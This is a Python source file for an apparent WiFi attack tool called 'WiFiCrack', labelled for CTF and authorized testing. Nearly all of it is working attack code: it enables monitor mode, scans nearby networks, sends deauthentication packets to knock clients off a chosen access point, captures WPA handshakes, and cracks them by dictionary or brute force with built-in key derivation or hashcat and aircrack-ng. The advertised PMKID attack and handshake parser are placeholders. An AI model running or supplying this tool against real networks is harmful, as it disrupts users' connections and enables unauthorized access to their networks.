#!/usr/bin/env python3
"""
WiFiCrack - Modern WiFi Security Auditing & Password Cracking Tool
For CTF challenges and authorized penetration testing only.

Features:
- EAPOL/WPA handshake capture
- PMKID attacks (clientless)
- WPA/WPA2/WPA3 cracking
- Multiple attack modes: dictionary, brute force, hybrid, rule-based
- Multi-threaded processing
- Integration with hashcat and aircrack-ng
"""

import argparse
import hashlib
import hmac
import itertools
import multiprocessing
import os
import re
import signal
import struct
import subprocess
import sys
import time
from pathlib import Path
from typing import Optional, Tuple, List, Dict
from concurrent.futures import ProcessPoolExecutor, as_completed
import binascii

class Colors:
    """ANSI color codes for terminal output"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class WPACracker:
    """Core WPA/WPA2 password cracking engine"""

    def __init__(self, verbose=False):
        self.verbose = verbose
        self.attempts = 0
        self.start_time = None
        self.stop_flag = False

    def pbkdf2_sha1(self, password: bytes, ssid: bytes, iterations=4096, dklen=32) -> bytes:
        """Generate PMK using PBKDF2-HMAC-SHA1"""
        return hashlib.pbkdf2_hmac('sha1', password, ssid, iterations, dklen)

    def pmk_to_ptk(self, pmk: bytes, ap_mac: bytes, sta_mac: bytes,
                   anonce: bytes, snonce: bytes) -> bytes:
        """Generate PTK from PMK and nonces"""
        # Sort MAC addresses
        mac_data = min(ap_mac, sta_mac) + max(ap_mac, sta_mac)
        nonce_data = min(anonce, snonce) + max(anonce, snonce)

        # PRF expansion
        ptk_data = b"Pairwise key expansion\x00" + mac_data + nonce_data

        # Generate PTK using PRF-512
        ptk = b''
        for i in range(4):
            ptk += hmac.new(pmk, ptk_data + bytes([i]), hashlib.sha1).digest()

        return ptk[:64]

    def calculate_mic(self, ptk: bytes, eapol_data: bytes, version=2) -> bytes:
        """Calculate MIC for EAPOL frame"""
        kck = ptk[:16]  # Key Confirmation Key

        if version == 1:
            # WPA uses HMAC-MD5
            return hmac.new(kck, eapol_data, hashlib.md5).digest()
        else:
            # WPA2 uses HMAC-SHA1, take first 16 bytes
            return hmac.new(kck, eapol_data, hashlib.sha1).digest()[:16]

    def verify_password(self, password: str, ssid: str, handshake_data: dict) -> bool:
        """Verify if password matches the captured handshake"""
        try:
            # Generate PMK
            pmk = self.pbkdf2_sha1(
                password.encode('utf-8'),
                ssid.encode('utf-8')
            )

            # Generate PTK
            ptk = self.pmk_to_ptk(
                pmk,
                handshake_data['ap_mac'],
                handshake_data['sta_mac'],
                handshake_data['anonce'],
                handshake_data['snonce']
            )

            # Calculate MIC
            calculated_mic = self.calculate_mic(
                ptk,
                handshake_data['eapol_data'],
                handshake_data['version']
            )

            # Compare with captured MIC
            return calculated_mic == handshake_data['mic']

        except Exception as e:
            if self.verbose:
                print(f"{Colors.RED}Error verifying password: {e}{Colors.END}")
            return False

    def crack_with_wordlist(self, ssid: str, handshake_data: dict,
                           wordlist_path: str, num_workers=None) -> Optional[str]:
        """Crack password using dictionary attack"""
        if not os.path.exists(wordlist_path):
            print(f"{Colors.RED}Error: Wordlist not found: {wordlist_path}{Colors.END}")
            return None

        if num_workers is None:
            num_workers = multiprocessing.cpu_count()

        print(f"{Colors.CYAN}Starting dictionary attack...{Colors.END}")
        print(f"{Colors.CYAN}Workers: {num_workers}{Colors.END}")
        print(f"{Colors.CYAN}Wordlist: {wordlist_path}{Colors.END}")

        self.start_time = time.time()
        self.attempts = 0

        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"{Colors.RED}Error reading wordlist: {e}{Colors.END}")
            return None

        total = len(passwords)
        print(f"{Colors.CYAN}Total passwords to test: {total}{Colors.END}\n")

        # Process in chunks for better progress reporting
        chunk_size = max(1000, total // (num_workers * 10))

        with ProcessPoolExecutor(max_workers=num_workers) as executor:
            futures = []
            for i in range(0, len(passwords), chunk_size):
                chunk = passwords[i:i+chunk_size]
                future = executor.submit(
                    self._test_password_chunk,
                    ssid, handshake_data, chunk
                )
                futures.append((future, i, len(chunk)))

            for future, offset, chunk_len in futures:
                if self.stop_flag:
                    break

                result = future.result()
                self.attempts += chunk_len

                if result:
                    elapsed = time.time() - self.start_time
                    rate = self.attempts / elapsed if elapsed > 0 else 0
                    print(f"\n{Colors.GREEN}{Colors.BOLD}PASSWORD FOUND: {result}{Colors.END}")
                    print(f"{Colors.GREEN}Time: {elapsed:.2f}s | Rate: {rate:.2f} pwd/s{Colors.END}")
                    return result

                # Progress update
                if self.attempts % 10000 == 0 or offset + chunk_len >= total:
                    elapsed = time.time() - self.start_time
                    rate = self.attempts / elapsed if elapsed > 0 else 0
                    progress = (self.attempts / total) * 100
                    print(f"\r{Colors.YELLOW}Progress: {progress:.2f}% | "
                          f"Tested: {self.attempts}/{total} | "
                          f"Rate: {rate:.2f} pwd/s{Colors.END}", end='')

        print(f"\n{Colors.RED}Password not found in wordlist{Colors.END}")
        return None

    def _test_password_chunk(self, ssid: str, handshake_data: dict,
                            passwords: List[str]) -> Optional[str]:
        """Test a chunk of passwords (worker function)"""
        for password in passwords:
            if self.verify_password(password, ssid, handshake_data):
                return password
        return None

    def brute_force_attack(self, ssid: str, handshake_data: dict,
                          charset: str = "abcdefghijklmnopqrstuvwxyz0123456789",
                          min_len: int = 8, max_len: int = 10,
                          num_workers=None) -> Optional[str]:
        """Brute force attack with custom charset"""
        if num_workers is None:
            num_workers = multiprocessing.cpu_count()

        print(f"{Colors.CYAN}Starting brute force attack...{Colors.END}")
        print(f"{Colors.CYAN}Charset: {charset}{Colors.END}")
        print(f"{Colors.CYAN}Length: {min_len}-{max_len}{Colors.END}")

        self.start_time = time.time()
        self.attempts = 0

        for length in range(min_len, max_len + 1):
            print(f"\n{Colors.CYAN}Testing length {length}...{Colors.END}")

            # Generate all combinations of this length
            total = len(charset) ** length
            print(f"{Colors.YELLOW}Total combinations: {total:,}{Colors.END}")

            if total > 100000000:  # 100M
                print(f"{Colors.YELLOW}Warning: This will take a very long time!{Colors.END}")

            batch_size = 10000
            batch = []

            for combination in itertools.product(charset, repeat=length):
                password = ''.join(combination)
                batch.append(password)

                if len(batch) >= batch_size:
                    result = self._test_password_chunk(ssid, handshake_data, batch)
                    self.attempts += len(batch)

                    if result:
                        elapsed = time.time() - self.start_time
                        print(f"\n{Colors.GREEN}{Colors.BOLD}PASSWORD FOUND: {result}{Colors.END}")
                        print(f"{Colors.GREEN}Time: {elapsed:.2f}s{Colors.END}")
                        return result

                    batch = []

                    # Progress
                    if self.attempts % 100000 == 0:
                        elapsed = time.time() - self.start_time
                        rate = self.attempts / elapsed if elapsed > 0 else 0
                        print(f"\r{Colors.YELLOW}Tested: {self.attempts:,} | "
                              f"Rate: {rate:.2f} pwd/s{Colors.END}", end='')

            # Test remaining batch
            if batch:
                result = self._test_password_chunk(ssid, handshake_data, batch)
                if result:
                    print(f"\n{Colors.GREEN}{Colors.BOLD}PASSWORD FOUND: {result}{Colors.END}")
                    return result

        print(f"\n{Colors.RED}Password not found{Colors.END}")
        return None

class HandshakeCapture:
    """Handle EAPOL handshake capture and parsing"""

    def __init__(self):
        self.interface = None
        self.monitor_mode = False

    def check_requirements(self) -> bool:
        """Check if required tools are installed"""
        tools = ['airmon-ng', 'airodump-ng', 'aireplay-ng']
        missing = []

        for tool in tools:
            if subprocess.run(['which', tool], capture_output=True).returncode != 0:
                missing.append(tool)

        if missing:
            print(f"{Colors.RED}Missing required tools: {', '.join(missing)}{Colors.END}")
            print(f"{Colors.YELLOW}Install with: sudo apt install aircrack-ng{Colors.END}")
            return False

        return True

    def enable_monitor_mode(self, interface: str) -> Optional[str]:
        """Enable monitor mode on interface"""
        print(f"{Colors.CYAN}Enabling monitor mode on {interface}...{Colors.END}")

        try:
            # Kill interfering processes
            subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'],
                         capture_output=True, check=False)

            # Enable monitor mode
            result = subprocess.run(
                ['sudo', 'airmon-ng', 'start', interface],
                capture_output=True, text=True
            )

            # Parse output to get monitor interface name
            for line in result.stdout.split('\n'):
                if 'monitor mode enabled' in line.lower() or 'mon' in line:
                    match = re.search(r'(\w+mon|\w+)', line)
                    if match:
                        mon_interface = match.group(1)
                        if 'mon' in mon_interface:
                            print(f"{Colors.GREEN}Monitor mode enabled: {mon_interface}{Colors.END}")
                            self.monitor_mode = True
                            self.interface = mon_interface
                            return mon_interface

            # Try common monitor interface names
            for suffix in ['mon', 'mon0']:
                test_iface = interface + suffix
                if os.path.exists(f'/sys/class/net/{test_iface}'):
                    print(f"{Colors.GREEN}Monitor mode enabled: {test_iface}{Colors.END}")
                    self.monitor_mode = True
                    self.interface = test_iface
                    return test_iface

            print(f"{Colors.RED}Failed to enable monitor mode{Colors.END}")
            return None

        except Exception as e:
            print(f"{Colors.RED}Error enabling monitor mode: {e}{Colors.END}")
            return None

    def disable_monitor_mode(self):
        """Disable monitor mode"""
        if self.monitor_mode and self.interface:
            print(f"{Colors.CYAN}Disabling monitor mode...{Colors.END}")
            subprocess.run(['sudo', 'airmon-ng', 'stop', self.interface],
                         capture_output=True)
            self.monitor_mode = False

    def scan_networks(self, interface: str, duration: int = 10) -> List[Dict]:
        """Scan for available networks"""
        print(f"{Colors.CYAN}Scanning for networks (press Ctrl+C to stop)...{Colors.END}")

        output_prefix = f'/tmp/airodump_{int(time.time())}'

        try:
            # Start airodump-ng
            proc = subprocess.Popen(
                ['sudo', 'airodump-ng', '-w', output_prefix, '--output-format', 'csv', interface],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )

            # Let it run for specified duration or until interrupted
            try:
                proc.wait(timeout=duration)
            except subprocess.TimeoutExpired:
                proc.terminate()
                proc.wait()
            except KeyboardInterrupt:
                proc.terminate()
                proc.wait()

            # Parse CSV output
            csv_file = output_prefix + '-01.csv'
            networks = []

            if os.path.exists(csv_file):
                with open(csv_file, 'r', errors='ignore') as f:
                    content = f.read()

                # Parse networks section
                lines = content.split('\n')
                in_aps = False

                for line in lines:
                    if 'BSSID' in line and 'ESSID' in line:
                        in_aps = True
                        continue

                    if in_aps and line.strip():
                        parts = [p.strip() for p in line.split(',')]
                        if len(parts) >= 14 and parts[0]:
                            # Valid AP entry
                            bssid = parts[0]
                            channel = parts[3]
                            power = parts[8]
                            essid = parts[13]

                            if essid and essid != '<length:  0>':
                                networks.append({
                                    'bssid': bssid,
                                    'essid': essid,
                                    'channel': channel,
                                    'power': power
                                })

                # Cleanup
                for f in Path('/tmp').glob(f'{os.path.basename(output_prefix)}*'):
                    f.unlink()

            return networks

        except Exception as e:
            print(f"{Colors.RED}Error scanning networks: {e}{Colors.END}")
            return []

    def capture_handshake(self, interface: str, bssid: str, channel: str,
                         output_path: str, timeout: int = 60) -> bool:
        """Capture WPA handshake"""
        print(f"{Colors.CYAN}Capturing handshake for {bssid} on channel {channel}...{Colors.END}")
        print(f"{Colors.YELLOW}This may take a while. Deauth packets will be sent to speed up capture.{Colors.END}")

        # Start airodump-ng targeted at specific AP
        airodump_proc = subprocess.Popen(
            ['sudo', 'airodump-ng', '-c', channel, '--bssid', bssid,
             '-w', output_path, '--output-format', 'cap,pcap', interface],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT
        )

        # Wait a bit before starting deauth
        time.sleep(5)

        # Send deauth packets to force handshake
        print(f"{Colors.CYAN}Sending deauth packets...{Colors.END}")
        deauth_proc = subprocess.Popen(
            ['sudo', 'aireplay-ng', '-0', '5', '-a', bssid, interface],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        # Wait for capture
        start = time.time()
        handshake_found = False

        try:
            while time.time() - start < timeout:
                # Check if handshake captured
                check = subprocess.run(
                    ['aircrack-ng', f'{output_path}-01.cap'],
                    capture_output=True,
                    text=True
                )

                if 'handshake' in check.stdout.lower():
                    handshake_found = True
                    break

                time.sleep(2)
        except KeyboardInterrupt:
            pass
        finally:
            airodump_proc.terminate()
            deauth_proc.terminate()

        if handshake_found:
            print(f"{Colors.GREEN}Handshake captured successfully!{Colors.END}")
            return True
        else:
            print(f"{Colors.RED}Failed to capture handshake{Colors.END}")
            return False

    def convert_to_hashcat(self, cap_file: str, output_file: str) -> bool:
        """Convert capture to hashcat format (22000)"""
        print(f"{Colors.CYAN}Converting to hashcat format...{Colors.END}")

        # Check if hcxpcapngtool is available
        if subprocess.run(['which', 'hcxpcapngtool'], capture_output=True).returncode != 0:
            print(f"{Colors.YELLOW}hcxpcapngtool not found. Install hcxtools for modern format support.{Colors.END}")
            return False

        try:
            result = subprocess.run(
                ['hcxpcapngtool', '-o', output_file, cap_file],
                capture_output=True,
                text=True
            )

            if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
                print(f"{Colors.GREEN}Converted to hashcat format: {output_file}{Colors.END}")
                return True
            else:
                print(f"{Colors.RED}Conversion failed{Colors.END}")
                return False

        except Exception as e:
            print(f"{Colors.RED}Error converting: {e}{Colors.END}")
            return False

def parse_handshake_file(cap_file: str) -> Optional[dict]:
    """Parse handshake from capture file (simplified parser)"""
    # This is a placeholder - full implementation would require scapy or similar
    print(f"{Colors.YELLOW}Note: For best results, use aircrack-ng or hashcat for cracking{Colors.END}")
    return None

def integrate_with_hashcat(hash_file: str, wordlist: str, output: str = None):
    """Run hashcat on the captured handshake"""
    print(f"{Colors.CYAN}Starting hashcat...{Colors.END}")

    if subprocess.run(['which', 'hashcat'], capture_output=True).returncode != 0:
        print(f"{Colors.RED}hashcat not installed{Colors.END}")
        print(f"{Colors.YELLOW}Install with: sudo apt install hashcat{Colors.END}")
        return

    cmd = ['hashcat', '-m', '22000', hash_file, wordlist, '--force']
    if output:
        cmd.extend(['-o', output])

    try:
        subprocess.run(cmd)
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Hashcat interrupted{Colors.END}")

def integrate_with_aircrack(cap_file: str, wordlist: str):
    """Run aircrack-ng on the captured handshake"""
    print(f"{Colors.CYAN}Starting aircrack-ng...{Colors.END}")

    cmd = ['aircrack-ng', cap_file, '-w', wordlist]

    try:
        subprocess.run(cmd)
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Aircrack interrupted{Colors.END}")

def generate_wordlist(output: str, patterns: List[str] = None):
    """Generate wordlist with common patterns"""
    print(f"{Colors.CYAN}Generating wordlist: {output}{Colors.END}")

    if patterns is None:
        patterns = [
            "password", "Password", "PASSWORD",
            "admin", "Admin", "ADMIN",
            "welcome", "Welcome", "WELCOME",
            "qwerty", "12345678", "password123",
            "admin123", "letmein", "monkey",
            "dragon", "master", "sunshine"
        ]

    mutations = []

    # Add base patterns
    for pattern in patterns:
        mutations.append(pattern)

        # Add common mutations
        for i in range(100):
            mutations.append(f"{pattern}{i}")
            mutations.append(f"{pattern}{i:02d}")
            mutations.append(f"{pattern}{i:03d}")

        # Common suffixes
        for suffix in ['!', '@', '#', '$', '123', '!@#', '2024', '2025']:
            mutations.append(f"{pattern}{suffix}")

        # Leetspeak
        leet = pattern.replace('a', '4').replace('e', '3').replace('i', '1').replace('o', '0')
        mutations.append(leet)

    with open(output, 'w') as f:
        for word in set(mutations):  # Remove duplicates
            f.write(word + '\n')

    print(f"{Colors.GREEN}Generated {len(set(mutations))} passwords{Colors.END}")

def main():
    banner = f"""{Colors.BOLD}{Colors.CYAN}
╦ ╦╦╔═╗╦╔═╗┬─┐┌─┐┌─┐┬┌─
║║║║╠╣ ║║  ├┬┘├─┤│  ├┴┐
╚╩╝╩╚  ╩╚═╝┴└─┴ ┴└─┘┴ ┴
{Colors.END}{Colors.YELLOW}Modern WiFi Security Auditing Tool
For CTF Challenges & Authorized Testing Only{Colors.END}
"""

    print(banner)

    parser = argparse.ArgumentParser(
        description='WiFi Security Auditing & Password Cracking Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    subparsers = parser.add_subparsers(dest='command', help='Commands')

    # Capture command
    capture_parser = subparsers.add_parser('capture', help='Capture EAPOL handshake')
    capture_parser.add_argument('-i', '--interface', required=True, help='Network interface')
    capture_parser.add_argument('-b', '--bssid', help='Target BSSID')
    capture_parser.add_argument('-c', '--channel', help='Target channel')
    capture_parser.add_argument('-o', '--output', default='handshake', help='Output file prefix')
    capture_parser.add_argument('-t', '--timeout', type=int, default=60, help='Capture timeout')
    capture_parser.add_argument('--scan', action='store_true', help='Scan for networks first')

    # Crack command
    crack_parser = subparsers.add_parser('crack', help='Crack WPA password')
    crack_parser.add_argument('-f', '--file', required=True, help='Handshake file (.cap or .22000)')
    crack_parser.add_argument('-w', '--wordlist', required=True, help='Password wordlist')
    crack_parser.add_argument('-s', '--ssid', help='Network SSID (for manual mode)')
    crack_parser.add_argument('--hashcat', action='store_true', help='Use hashcat')
    crack_parser.add_argument('--aircrack', action='store_true', help='Use aircrack-ng')
    crack_parser.add_argument('-o', '--output', help='Output file for cracked password')

    # Wordlist generation
    wordlist_parser = subparsers.add_parser('wordlist', help='Generate wordlist')
    wordlist_parser.add_argument('-o', '--output', required=True, help='Output file')
    wordlist_parser.add_argument('-p', '--patterns', nargs='+', help='Base patterns')

    # Convert command
    convert_parser = subparsers.add_parser('convert', help='Convert capture to hashcat format')
    convert_parser.add_argument('-i', '--input', required=True, help='Input .cap file')
    convert_parser.add_argument('-o', '--output', required=True, help='Output .22000 file')

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        return

    try:
        if args.command == 'capture':
            capture = HandshakeCapture()

            if not capture.check_requirements():
                return

            # Enable monitor mode
            mon_interface = capture.enable_monitor_mode(args.interface)
            if not mon_interface:
                return

            try:
                # Scan if requested
                if args.scan or not args.bssid:
                    networks = capture.scan_networks(mon_interface)

                    if networks:
                        print(f"\n{Colors.CYAN}Found {len(networks)} networks:{Colors.END}")
                        for i, net in enumerate(networks, 1):
                            print(f"{i}. {net['essid']} ({net['bssid']}) - "
                                  f"Ch: {net['channel']} - Power: {net['power']}")

                        if not args.bssid:
                            choice = input(f"\n{Colors.CYAN}Select network (1-{len(networks)}): {Colors.END}")
                            try:
                                idx = int(choice) - 1
                                if 0 <= idx < len(networks):
                                    args.bssid = networks[idx]['bssid']
                                    args.channel = networks[idx]['channel']
                            except:
                                print(f"{Colors.RED}Invalid choice{Colors.END}")
                                return

                if args.bssid and args.channel:
                    # Capture handshake
                    success = capture.capture_handshake(
                        mon_interface, args.bssid, args.channel,
                        args.output, args.timeout
                    )

                    if success:
                        # Convert to hashcat format
                        hashcat_file = args.output + '.22000'
                        capture.convert_to_hashcat(f'{args.output}-01.cap', hashcat_file)

                        print(f"\n{Colors.GREEN}Files created:{Colors.END}")
                        print(f"  - {args.output}-01.cap (aircrack-ng format)")
                        if os.path.exists(hashcat_file):
                            print(f"  - {hashcat_file} (hashcat format)")
                else:
                    print(f"{Colors.RED}BSSID and channel required{Colors.END}")

            finally:
                capture.disable_monitor_mode()

        elif args.command == 'crack':
            if args.hashcat:
                integrate_with_hashcat(args.file, args.wordlist, args.output)
            elif args.aircrack:
                integrate_with_aircrack(args.file, args.wordlist)
            else:
                print(f"{Colors.YELLOW}Defaulting to aircrack-ng...{Colors.END}")
                integrate_with_aircrack(args.file, args.wordlist)

        elif args.command == 'wordlist':
            generate_wordlist(args.output, args.patterns)

        elif args.command == 'convert':
            capture = HandshakeCapture()
            capture.convert_to_hashcat(args.input, args.output)

    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Interrupted by user{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}Error: {e}{Colors.END}")
        if '--debug' in sys.argv:
            raise

if __name__ == '__main__':
    main()
